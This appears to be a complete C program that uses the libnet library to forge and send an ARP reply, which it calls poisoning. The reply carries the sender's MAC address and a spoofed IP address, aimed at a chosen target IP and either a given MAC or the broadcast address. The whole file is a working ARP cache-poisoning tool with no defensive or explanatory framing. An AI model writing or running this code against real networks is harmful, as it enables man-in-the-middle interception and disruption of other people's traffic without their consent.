#include "spoofing.h"

int main(int argc, char * argv[]) {
    char err_buf[LIBNET_ERRBUF_SIZE];

    char * spa_s, * tpa_s, * dev, * tha_s;
    spa_s = tpa_s = dev = NULL;

    uint32_t spa, tpa;
    spa = tpa = -1;

    struct libnet_ether_addr * sha_p;
    uint8_t * tha_p = NULL;

    libnet_t * l = NULL;

    int param = -1;

    // getting parameters
    while((param = getopt(argc, argv, "s:t:d:T:")) != -1) {
        switch (param)
        {
        case 's':
            spa_s = (char *) optarg;
        #ifdef DEBUG_H
            printf("[%s]: source proto address - \"%s\"\n", INFO, spa_s);
        #endif
            break;
        case 't': {}
            tpa_s = (char *) optarg;
        #ifdef DEBUG_H
            printf("[%s]: target proto address - \"%s\"\n", INFO, tpa_s);
        #endif
            break;
        case 'd':
            dev = (char *) optarg;
        #ifdef DEBUG_H
            printf("[%s]: device interface - \"%s\"\n", INFO, dev);
        #endif
            break;
        case 'T':
            tha_s = (char *) optarg;
        #ifdef DEBUG_H
            printf("[%s]: target mac address - \"%s\"\n", INFO, tha_s);
        #endif
            break;
        default:
            break;
        }
    }

    if (spa_s == NULL) {
        fprintf(stderr, "[%s]: spa_s == NULL\n", ERROR);
        exit(EXIT_FAILURE);
    }

    if (tpa_s == NULL) {
        fprintf(stderr, "[%s]: tpa_s == NULL\n", ERROR);
        exit(EXIT_FAILURE);   
    }

    if(dev == NULL) {
        fprintf(stderr, "[%s]: dev == NULL\n", ERROR);
        exit(EXIT_FAILURE);
    }

    // the start of spoofing
    if ((l = libnet_init(LIBNET_LINK, dev, err_buf)) == NULL)
        libnet_fatal("libnet_init", err_buf);

    if ((spa = libnet_name2addr4(l, spa_s, LIBNET_DONT_RESOLVE)) == -1) {
        libnet_destroy(l);
        libnet_fatal("libnet_name2addr4(l, spa_s, LIBNET_DONT_RESOLVE)", err_buf);
    }

    if ((tpa = libnet_name2addr4(l, tpa_s, LIBNET_DONT_RESOLVE)) == -1) {
        libnet_destroy(l);
        libnet_fatal("libnet_name2addr4(l, tpa_s, LIBNET_DONT_RESOLVE)", err_buf);
    }

    // setting sha and tha variables

    if (tha_s == NULL) {
#ifdef DEBUG_H
        printf("[%s]: setting target host address to ff:ff:ff:ff:ff:ff\n", INFO);
#endif
        int res = set_broadcast_address(&tha_p);
        if(res != OK) {
            fprintf(
                stderr, 
                "[%s]: error at \"%s\"\n",
                ERROR,
                "set_broadcast_address"
            );
            libnet_destroy(l);
            exit(EXIT_FAILURE);
        }
    } else {
        int len = 0;
        tha_p = libnet_hex_aton(tha_s, &len);
        assert(len == MAC_SIZE);
        if (tha_p == NULL) {
            fprintf(
                stderr, 
                "[%s]: error at \"%s\"\n",
                ERROR,
                "libnet_hex_aton"
            );
            libnet_destroy(l);
            exit(EXIT_FAILURE);
        }
    }

    if (set_hardware_address(l, &sha_p) != OK) {
        fprintf(
            stderr, 
            "[%s]: error at \"%s\"\n",
            ERROR,
            "set_broadcast_address"
        );
        free(tha_p);
        libnet_destroy(l);
        exit(EXIT_FAILURE);
    }

    if (libnet_autobuild_arp(
        ARPOP_REPLY,
        &(sha_p -> ether_addr_octet[0]), // our MAC address
        (uint8_t *)(&spa), // user ip addres "-s <%.%.%.%>"
        tha_p,
        (uint8_t *)(&tpa),
        l
    ) == -1) {
        free(tha_p);
        libnet_destroy(l);
        libnet_fatal("libnet_autobuild_arp", err_buf);
    }

    if (libnet_autobuild_ethernet(
        tha_p, // just ff:ff:ff:ff:ff:ff,
        ETHERTYPE_ARP,
        l
    ) == -1) {
        free(tha_p);
        libnet_destroy(l);
        libnet_fatal("libnet_autobuild_ethernet", err_buf);
    }

    int bytes_written = -1;
    if ((bytes_written = libnet_write(l)) == -1) {
        free(tha_p);
        libnet_destroy(l);
        libnet_fatal("libnet_write(l)", err_buf);
    }


#ifdef DEBUG_H
    printf("[%s]: Bytes written - %d!\n", INFO, bytes_written);
    printf("[%s]: Finished Poisoning!\n", INFO);
#endif
    free(tha_p);
    libnet_destroy(l);
    return 0;
}